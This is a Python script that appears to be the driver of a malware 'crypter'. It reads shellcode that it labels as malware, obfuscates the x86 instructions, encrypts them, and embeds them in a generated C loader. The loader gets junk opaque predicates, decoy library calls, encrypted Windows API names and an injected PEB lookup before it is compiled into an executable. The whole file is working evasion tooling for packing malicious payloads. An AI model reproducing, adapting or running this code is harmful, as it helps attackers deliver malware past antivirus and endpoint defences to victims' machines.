import re
import sys
import csv
import json
import clang
import pycparser

from clang.cindex import Config
Config.set_library_file("/usr/lib/llvm-21/lib/libclang.so")
from pycparser import c_generator
from clang.cindex import TypeKind
from collections import defaultdict
from clang.cindex import Index, CursorKind, TypeKind
from src.lib.crypto.rng import prng

import networkx as nx
import matplotlib.pyplot as plt
import src.lib.chandling.ctypes as ctypes
import src.lib.chandling.cbuilder as cbuilder
import src.lib.obfuscation.utils.scope as scope
import src.lib.chandling.filechecker as filechecker
import src.lib.chandling.headerhandler as headerhandler
import src.lib.chandling.pycparserfinder as pycparserfinder
import src.lib.obfuscation.utils.namegenerator as namegenerator
import src.lib.chandling.functionextractors as functionextractors
import src.lib.chandling.variableclassifier as variableclassifier
import src.lib.chandling.dependencyresolver as dependencyresolver
import src.lib.chandling.compilationhandler as compilationhandler
import src.lib.obfuscation.control.opaqueif as opaqueif
import src.lib.crypto.encryption as encryption
import src.lib.obfuscation.control.opaquevariable as opaquevariable
import src.lib.obfuscation.control.opaquepredicate as opaquepredicate
import src.lib.obfuscation.visitors.opaqueifvisitor as opaqueifvisitor
import src.lib.obfuscation.control.opaquefunctioncall as opaquefunctioncall
import src.lib.obfuscation.visitors.opaquevariablevisitor as opaquevariablevisitor
import src.lib.obfuscation.visitors.opaquefunctioncallvisitor as opaquefunctioncallvisitor

import src.lib.isahandling.isa as isa
import src.lib.isahandling.sequencing as sequencing
import src.lib.isahandling.isabyteshandler as isabyteshandler
import src.lib.obfuscation.assembly.movobfuscation as movobfuscation
import src.lib.obfuscation.assembly.pushobfuscation as pushobfuscation
import src.lib.obfuscation.assembly.movdispobfuscation as movdispobfuscation
import src.lib.obfuscation.assembly.flowmanglingobfuscation as flowmanglingobfuscation

LIBRARIES = '/usr/i686-w64-mingw32/lib/'
ORIGINAL_HEADERS_FOLDER = '/usr/i686-w64-mingw32/include/'
TMP_INPUT_FILE = './src/crypters/idata_obfuscation/merged.c'
FAKE_IMPORTS = '-I./src/fake_imports'
EXCLUDED_LIBRARIES = set(['d3dx9_38', 'glaux', 'qutil', 'xinput1_3', 'd3drm', 'penwin32', 'p2p'])

if __name__ == '__main__':
    if len(sys.argv) < 6:
        print(f"Usage: {sys.argv[0]} <input.c> <output.c> <output_executable.exe> <json_headers_dataset.json> <shellcode_path.bin> [seed]")
        sys.exit(1)

    input_file  = sys.argv[1]
    output_file = sys.argv[2]
    output_executable_path = sys.argv[3]
    json_headers_dataset = sys.argv[4]
    shellcode_path = sys.argv[5]
    seed = None
    if len(sys.argv) == 7:
        print('Using selected seed...')
        seed = sys.argv[6]
        key = seed[:prng.key_length * 2]
        nonce = seed[prng.key_length * 2: (prng.key_length + prng.nonce_length) * 2]
        prng.key = bytes.fromhex(key)
        prng.nonce = bytes.fromhex(nonce)
        prng.commit_changes()
    else:
        print("No seed was given, using a random seed...")
    
    print('Attempting conversion...')
    while True:
        try:
            ast = pycparser.parse_file(
                input_file,
                use_cpp=True,
                cpp_path='cpp',
                cpp_args=[FAKE_IMPORTS]
            )
            print('Configuring objects...')

            integer_types = ctypes.I686PCWindowsGNU
            builder = cbuilder.StandardCBuilder(integer_types)
            frequent_builder = cbuilder.StandardFrequentCodeCBuilder(builder, integer_types)
            variable_type = ctypes.CTypes.UNSIGNED_INT
            name_generator = namegenerator.StandardVariableNameGenerator(16)

            print('Creating opaque variable objects...')
            
            residue_variable = opaquevariable.ResidueTrueOpaqueVariable(integer_types, builder, frequent_builder, name_generator)
            raprime_variable = opaquevariable.RAPrimeOpaqueVariable(integer_types, builder, frequent_builder, name_generator)
            random_address_variable = opaquevariable.AddressRandomOpaqueVariable(integer_types, builder, frequent_builder, name_generator)

            print('Creating opaque predicate objects...')

            is_odd_or_two_predicate = opaquepredicate.IsOddOrTwoOpaquePredicate(builder)
            pythagorean_triple_predicate = opaquepredicate.PythagoreanTripleOpaquePredicate(builder)
            dummy_predicate = opaquepredicate.DummyOpaquePredicate(builder)
            bogus_predicate = opaquepredicate.BogusBooleanExpressionOpaquePredicate(builder)

            print('Creating opaque if objects...')

            junk_if = opaqueif.JunkOpaqueIf(builder, variable_type)
            bogus_flow_if = opaqueif.BogusFlowOpaqueIf(builder)

            print('Creating scope...')
            scope_handler = scope.StandardScope()

            print('Creating visitors to inject variables...')
            variable_injection_visitors = []
            for opaque_variable in [residue_variable, raprime_variable, random_address_variable]:
                variable_injection_visitors.append(opaquevariablevisitor.InjectOpaqueVariableVisitor(builder, opaque_variable, variable_type, scope_handler, 3, 0.5))

            print('Injecting variables...')
            for viv in variable_injection_visitors:
                viv.visit(ast)

            print('Gathering libraries to inject into the executable...')
            cleaned_libraries = []
            with open(json_headers_dataset, 'r') as json_file:
                unclean_libraries_to_use = json.load(json_file)
                for key in unclean_libraries_to_use:
                    inner_json = unclean_libraries_to_use[key]
                    if not inner_json['functions'] == [] and not inner_json['library_name'] in EXCLUDED_LIBRARIES:
                        cleaned_libraries.append({key : inner_json})

            print('Selecting compiler and target to use...')
            USED_COMPILER = compilationhandler.AvailableCompilationTools.CLANG
            USED_TARGET = compilationhandler.TargetMachines.I686PCWindowsGNU 
            USED_LIBRARIES = set()

            extractor = dependencyresolver.ClangDependencyResolver()
            handler = headerhandler.StandardHeaderResolver()
            
            print('Attempting dependencies extraction...')
            graph = None
            list_of_chosen_functions = []
            while True:
                try:
                    number_of_libraries = prng.get_range_unsigned_integer(3,1)
                    selected_libraries = prng.random_selection(cleaned_libraries, number_of_libraries)
                    graph = None
                    list_of_chosen_functions = []
                    USED_LIBRARIES = set()
                    for item_library in selected_libraries:
                        key = list(item_library.keys())[0]
                
                        header_path = item_library[key]['header_path']
                        library_name = item_library[key]['library_name']
                        functions = item_library[key]['functions']
                
                        chosen_upper_limit = min(20, len(functions))
                        number_of_functions_chosen = max(1, prng.get_range_unsigned_integer(chosen_upper_limit))
                        chosen_functions = prng.random_selection(functions, number_of_functions_chosen)

                        USED_LIBRARIES.add(compilationhandler.library_identity(library_name))

                        print(f'Adding functions of library {library_name}...')
                        extractor.parse(header_path, ORIGINAL_HEADERS_FOLDER)
                        for function in chosen_functions:
                            list_of_chosen_functions.append(function)
                            if graph is None:
                                graph = extractor.resolve_dependencies(function)
                            else:
                                graph = extractor.resolve_dependencies(function,graph)
                except Exception as e:
                    print('There was an error with this version')
                    print(e)
                else:
                    print('Succeeded :)')
                    break

            print('Creating ast of dependencies and clang and pycparser code...')
            clang_text, pycparser_text = handler.print_code(graph)
            dependencies_ast = pycparser.CParser().parse(pycparser_text)
            
            print('Creating last objects to use opaque function calls')

            classifier = variableclassifier.StandardVariableClassifier()
            function_finder = pycparserfinder.FunctionDeclarationFinder()
            name_generator = namegenerator.RandomNameGenerator(16)

            no_function_call_opaque = opaquefunctioncall.NoCallOpaqueFunctionCall(builder, frequent_builder, name_generator, integer_types, function_finder, classifier, list_of_chosen_functions, dependencies_ast, graph)

            print('Using funciton opaques...')
            for opaque_predicate in [is_odd_or_two_predicate, pythagorean_triple_predicate, dummy_predicate, bogus_predicate]:
                function_call_visitor = opaquefunctioncallvisitor.OpaqueFunctionCallVisitor(opaque_predicate, no_function_call_opaque, ctypes.CTypes.UNSIGNED_INT, scope_handler, 8, 0.3)
                function_call_visitor.visit(ast)

            print('Creating visitors to inject opaque true ifs...')
            if_injection_visitors = []
            for opaque_predicate in [is_odd_or_two_predicate, pythagorean_triple_predicate, dummy_predicate, bogus_predicate]:
                for opaque_if in [junk_if, bogus_flow_if]:
                    if_injection_visitors.append(opaqueifvisitor.TrueOpaqueIfVisitor(opaque_predicate, opaque_if, variable_type, scope_handler, 8, 0.3))

            for iiv in if_injection_visitors:
                iiv.visit(ast)
            
            print('Generating c file...')

            gen = c_generator.CGenerator()
            result = gen.visit(ast)

            with open(output_file, 'w') as f:
                f.write(result)

            with open(output_file, 'r') as f:
                content = f.read()

            replacements = [
                ('LPVOID (*)(LPVOID, SIZE_T, DWORD, DWORD)', 'LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)'),
                ('BOOL (*)(LPVOID, SIZE_T, DWORD)', 'BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)'),
                ('HANDLE (*)(DWORD)', 'HANDLE (__stdcall *)(DWORD)'),
                ('BOOL (*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)', 'BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)'),
                ('LPVOID (*)(LPVOID, SIZE_T, DWORD, DWORD)', 'LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)'),
                ('HMODULE (*)(const char *)', 'HMODULE (__stdcall *)(const char *)'),
                ('void *(*)(HMODULE, const char *)', 'void *(__stdcall *)(HMODULE, const char *)'),
                ('BOOL (*)(LPVOID, DWORD, DWORD, DWORD *)', 'BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD *)'),
                ('HANDLE (*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)', 'HANDLE (__stdcall *)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)'),
                ('BOOL (*)(HANDLE)','BOOL (__stdcall *)(HANDLE)'),
                ('BOOL (*)(LPVOID, DWORD, DWORD, DWORD*)','BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)'),
                ('typedef VOID (*PPS_POST_PROCESS_INIT_ROUTINE)(VOID);', 'typedef VOID (__stdcall *PPS_POST_PROCESS_INIT_ROUTINE)(VOID);'),
                ('BOOL VirtualFree(',           'BOOL __stdcall VirtualFree('),
                ('HANDLE GetStdHandle(',        'HANDLE __stdcall GetStdHandle('),
                ('BOOL WriteFile(',             'BOOL __stdcall WriteFile('),
                ('HANDLE GetProcessHeap(',      'HANDLE __stdcall GetProcessHeap('),
                ('LPVOID HeapAlloc(',           'LPVOID __stdcall HeapAlloc('),
                ('BOOL HeapFree(',              'BOOL __stdcall HeapFree('),
                ('BOOL VirtualProtect(',        'BOOL __stdcall VirtualProtect('),
                ('LPVOID VirtualAlloc(',        'LPVOID __stdcall VirtualAlloc('),
                ('HMODULE GetModuleHandleA(',   'HMODULE __stdcall GetModuleHandleA('),
                ('HMODULE LoadLibraryA(',       'HMODULE __stdcall LoadLibraryA('),
                ('void *GetProcAddress(',       'void * __stdcall GetProcAddress('),
            ]
            for old, new in replacements:
                content = content.replace(old, new)

            final_content = clang_text + '\n' + content
            
            print('Reading malware...')

            with open(shellcode_path, "rb") as f:
                input_shellcode = f.read()
           
            print('Obfuscating shellcode...')

            isa_x86_handler = isabyteshandler.X86ISAConversionHandler()
            shellcode_instructions = isa_x86_handler.convert_to_instructions(input_shellcode)

            mov_obfuscator = movobfuscation.StandardX86MOVObfuscator()
            push_obfuscator = pushobfuscation.StandardX86PUSHObfuscator()
            mov_disp_obfuscator = movdispobfuscation.StandardX86MOVDISPObfuscator()
            flow_mangling_obfuscation = flowmanglingobfuscation.StandardX86FlowManglingObfuscator()
            final_sequencer = sequencing.X86SequencingHandler()

            print('Replacing pushes')
            shellcode_index = 0
            shellcode_length = len(shellcode_instructions)
            while shellcode_index < shellcode_length:
                next_instruction = shellcode_instructions[shellcode_index]
                if next_instruction.identified_function in [isa.X86Instructions.PUSHIMM8, isa.X86Instructions.PUSHIMM32]:
                    new_instruction_list = push_obfuscator.obfuscate(next_instruction)

                    del shellcode_instructions[shellcode_index]

                    for item in reversed(new_instruction_list):
                        shellcode_instructions.insert(shellcode_index, item)

                    shellcode_index += len(new_instruction_list)
                else:
                    shellcode_index += 1
                shellcode_length = len(shellcode_instructions)

            print('Obscuring movs...')
            total_num_iterations = 2 ** 10
            print(f'Iterating {total_num_iterations}')
            for i in range(total_num_iterations):
                shellcode_index = 0
                shellcode_length = len(shellcode_instructions)
                while shellcode_index < shellcode_length:
                    next_instruction = shellcode_instructions[shellcode_index]

                    taken_chance = prng.chance(0.4)
                    
                    if taken_chance and next_instruction.identified_function in [isa.X86Instructions.MOVR8DISP8MEM,isa.X86Instructions.MOVR8DISP32MEM, isa.X86Instructions.MOVR16DISP8MEM, isa.X86Instructions.MOVR16DISP32MEM, isa.X86Instructions.MOVR32DISP8MEM, isa.X86Instructions.MOVR32DISP32MEM, isa.X86Instructions.MOVR8BIS, isa.X86Instructions.MOVR16BIS, isa.X86Instructions.MOVR32BIS, isa.X86Instructions.MOVR8IS, isa.X86Instructions.MOVR16IS, isa.X86Instructions.MOVR32IS, isa.X86Instructions.MOVR8BISDISP8, isa.X86Instructions.MOVR8BISDISP32, isa.X86Instructions.MOVR16BISDISP8, isa.X86Instructions.MOVR16BISDISP32, isa.X86Instructions.MOVR32BISDISP8, isa.X86Instructions.MOVR32BISDISP32]:
                        new_instruction_list = mov_disp_obfuscator.obfuscate(next_instruction)

                        del shellcode_instructions[shellcode_index]

                        for item in reversed(new_instruction_list):
                            shellcode_instructions.insert(shellcode_index, item)

                        shellcode_index += len(new_instruction_list)
                    elif taken_chance and next_instruction.identified_function in [isa.X86Instructions.MOVR8IMM8, isa.X86Instructions.MOVR16IMM16, isa.X86Instructions.MOVR32IMM32]:
                        new_instruction_list = mov_obfuscator.obfuscate(next_instruction)

                        del shellcode_instructions[shellcode_index]

                        for item in reversed(new_instruction_list):
                            shellcode_instructions.insert(shellcode_index, item)

                        shellcode_index += len(new_instruction_list)
                    else:
                        shellcode_index += 1

                    shellcode_length = len(shellcode_instructions)

                if prng.chance(0.3):
                    for i in range(8):
                        flow_mangling_obfuscation.obfuscate(shellcode_instructions)
            
            print('Fixing jumps in the shellcode...')

            final_sequencer.fix_jumps(shellcode_instructions)
            
            print('Converting shellcode back to bytes...')
            
            transformed_shellcode_instructions = isa_x86_handler.convert_to_bytes(shellcode_instructions)

            print('Creating encryption objects...')

            encryption_algorithm = encryption.SimpleMatrixEncryptionAlgorithm()

            print('Encrypting malware...')

            encrypted_data = encryption_algorithm.encrypt(transformed_shellcode_instructions)
            size_encrypted_malware = len(encrypted_data)
            encrypted_bytes_string = "".join(f"\\x{b:02x}" for b in encrypted_data)
            
            print('Writing encrypted malware to file...')
            
            final_content = re.sub(
                r'(char shellcode_to_execute\[\]\s*=\s*")[^"]*(")',
                lambda m: m.group(1) + encrypted_bytes_string + m.group(2),
                final_content
            )

            print('Placing kernel and function strings...')
            
            kernel_string = 'KERNEL32.DLL'.encode('utf-16-le') + b'\x00\x00'
            encrypted_kernel_string = encryption_algorithm.encrypt(kernel_string)
            
            kernel_library_function_string = 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree\x00CreateFileA\x00CloseHandle'.encode('ascii') + b'\x00'
            encrypted_kernel_library_function_string = encryption_algorithm.encrypt(kernel_library_function_string)
            
            # Replace kernel library name size
            final_content = re.sub(
                r'(int size_encrypted_kernel_library_name\s*=\s*)\d+(\s*;)',
                lambda m: m.group(1) + str(len(encrypted_kernel_string)) + m.group(2),
                final_content
            )

            # Replace kernel library name encrypted string
            final_content = re.sub(
                r'(char encrypted_kernel_library_name\[\]\s*=\s*)"[^"]*"(\s*;)',
                lambda m: m.group(1) + '"' + ''.join(f'\\x{b:02x}' for b in encrypted_kernel_string) + '"' + m.group(2),
                final_content
            )

            # Replace kernel library function names size
            final_content = re.sub(
                r'(int size_encrypted_kernel_library_function_names\s*=\s*)\d+(\s*;)',
                lambda m: m.group(1) + str(len(encrypted_kernel_library_function_string)) + m.group(2),
                final_content
            )

            # Replace kernel library function names encrypted string
            final_content = re.sub(
                r'(char encrypted_kernel_library_function_names\[\]\s*=\s*)"[^"]*"(\s*;)',
                lambda m: m.group(1) + '"' + ''.join(f'\\x{b:02x}' for b in encrypted_kernel_library_function_string) + '"' + m.group(2),
                final_content
            )
            
            print('Placing instruction to read PEB...')
            final_content = re.sub(
                r'void\s+init_kernel_library\s*\(\s*void\s*\)\s*\n\s*\{',
                r'void init_kernel_library(void)\n{\n    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));',
                final_content
            )

            print('Writing decryption key matrix to file...')
            
            key_bytes = encryption_algorithm.decrypt_key
            key_rows = [key_bytes[i:i+4] for i in range(0, 16, 4)]
            key_matrix_string = '{' + ', '.join('{' + ', '.join(str(int(byte_value)) for byte_value in individual_row) + '}' for individual_row in key_rows) + '}'
        
            print(f'The decryption key is {key_matrix_string}...')

            final_content = re.sub(
                r'(const int key_matrix_inverse\[4\]\[4\]\s*=\s*)\{.*?\};',
                lambda m: m.group(1) + key_matrix_string + ';',
                final_content
            )

            print('Writing final c file...')

            with open(output_file, 'w') as f:
                f.write(final_content)
            
            print('Compiling file into an executable...')
            
            compilation_handler_object = compilationhandler.StandardCompilationHandler(USED_COMPILER, USED_TARGET, USED_LIBRARIES)
            compilation_result = compilation_handler_object.compile_file(output_file, output_executable_path)
            if compilation_result:
                print('Compilation successful...')
            else:
                print('Something went something wrong with the compilation...')
                raise Exception('Trying again due to the compilation...')
        except Exception as e:
            print("There was an error during the process, retyring...")
            print(e)
        else:
            print("Ended")
            break
